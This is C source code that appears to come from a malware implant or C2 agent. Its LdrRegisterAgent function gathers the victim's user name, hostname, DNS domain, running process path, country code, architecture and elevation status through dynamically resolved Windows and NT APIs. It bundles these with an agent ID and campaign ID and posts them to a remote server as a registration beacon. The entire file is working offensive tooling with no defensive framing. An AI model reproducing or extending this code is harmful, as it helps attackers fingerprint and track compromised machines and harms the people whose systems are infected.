#include "../../includes/core/core.h"
#include "../../includes/loader/loader.h"
#include "../../includes/comms/comms.h"
#include "../../includes/parser/parser.h"

#ifndef UNLEN
#define UNLEN 256
#endif

BOOL CollectUserName(ParserWrite *p) {
	char buf[UNLEN + 1];
	DWORD bufSize = sizeof(buf);

	if(!ldr->win32->GetUserNameA(buf, &bufSize)) {
		return FALSE;
	}
	if(bufSize > 0) bufSize--;	/* GetUserNameA count includes the NUL */

	INT Wrote = ParserWriteBytes(p, (PBYTE)buf, bufSize);
	return Wrote == bufSize;
}


BOOL CollectHostName(ParserWrite *p) {
	char buf[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD bufSize = sizeof(buf);

	if(!ldr->win32->GetComputerNameExA(ComputerNameDnsHostname, buf, &bufSize)) {
		return FALSE;
	}
	INT Wrote = ParserWriteBytes(p, (PBYTE)buf, bufSize);
	return Wrote == bufSize;

}

BOOL CollectDomainName(ParserWrite *p) {
	char buf[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD bufSize = sizeof(buf);

	if(!ldr->win32->GetComputerNameExA(ComputerNameDnsDomain, buf, &bufSize)) {
		return FALSE;
	}
	INT Wrote = ParserWriteBytes(p, (PBYTE)buf, bufSize);
	return Wrote == bufSize;

}


BOOL CollectProcessName(ParserWrite *p) {
	CHAR buf[MAX_PATH];
	DWORD len = ldr->win32->GetModuleFileNameA(NULL, buf, MAX_PATH);
	if(len == 0) {
		return FALSE;
	}

	INT Wrote = ParserWriteBytes(p, (PBYTE)buf, len);
	return Wrote == len;
}

DWORD isElev() {
	HANDLE tok = NULL;
	TOKEN_ELEVATION Elev = {0};
	DWORD elev = FALSE;
	DWORD size = sizeof(TOKEN_ELEVATION);
	NTSTATUS stat;

	stat = ldr->win32->NtOpenProcessToken(CurrentProcess(), TOKEN_QUERY, &tok);
	if(NT_SUCCESS(stat)) {
		stat = ldr->win32->NtQueryInformationToken(tok, TokenElevation, &Elev, sizeof(Elev), &size);
		if(NT_SUCCESS(stat)) {
			elev = (Elev.TokenIsElevated != 0) ? 1 : 0;
		}
	}

	if(tok) {
		ldr->win32->CloseHandle(tok);
	}
	return elev;
}


BOOL CollectCountry(ParserWrite *p) {
	GEOID geo = ldr->win32->GetUserGeoId(GEOCLASS_NATION);

	INT total = ldr->win32->GetGeoInfoA(geo, GEO_ISO2, NULL, 0, 0);
	if(total <= 0) {
		return FALSE;
	}

	PBYTE buf = (PBYTE)ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, total);
	if(!buf) {
		return FALSE;
	}

	INT len = ldr->win32->GetGeoInfoA(geo, GEO_ISO2, (PCHAR)buf, total, 0);
	if(len > 0) {
		len--;	/* probe count includes the terminating NUL */
	}

	INT Wrote = 0;
	if(len > 0) {
		Wrote = ParserWriteBytes(p, buf, len);
	}

	ldr->win32->LocalFree(buf);
	return len > 0 && Wrote == len;
}


BOOL LdrRegisterAgent() {
	ParserWrite *p = ParserInitWrite();
	if(!p)
		return FALSE;

	if(!NwLoadApis()) {
		ParserClearWrite(p);
		return FALSE;
	}
	DBGA("[*] Loaded NW Apis\n");

	ParserWrite4(p, CODE_REGISTER);

	ParserWriteBytes(p, (PBYTE)ldr->config->AgentId, LdrStrlen(ldr->config->AgentId));
	ParserWriteBytes(p, (PBYTE)ldr->config->CampaignID, LdrStrlen(ldr->config->CampaignID));
	DBGA("[*] Wrote code + campaign + agend id\n");

	if(!CollectUserName(p)) {
		ParserClearWrite(p);
		return FALSE;
	}
	DBGA("[*] Collected Username\n");
	if(!CollectHostName(p)) {
		ParserClearWrite(p);
		return FALSE;
	}
	DBGA("[*] Collected Hostname\n");

	if(!CollectDomainName(p)) {
		ParserClearWrite(p);
		return FALSE;
	}
	DBGA("[*] Collected Domain name\n");

	if(!CollectProcessName(p)) {
		ParserClearWrite(p);
		return FALSE;
	}
	DBGA("[*] Collected ProcessName\n");

	if(!CollectCountry(p)) {
		ParserClearWrite(p);
		return FALSE;
	}
	DBGA("[*] Collected Country\n");

	DWORD arch = (sizeof(void*) != 4) ? 1 : 0;
	ParserWrite4(p, arch);
	ParserWrite4(p, isElev());
	DBGA("[*] Sending to server!\n");

	
	BOOL ok = NwPostOutput(ParserWriteReturnPointer(p), (DWORD)ParserWriteReturnSize(p));
	DBGA("[*] DONE\n");
	ParserClearWrite(p);
	return ok;
}
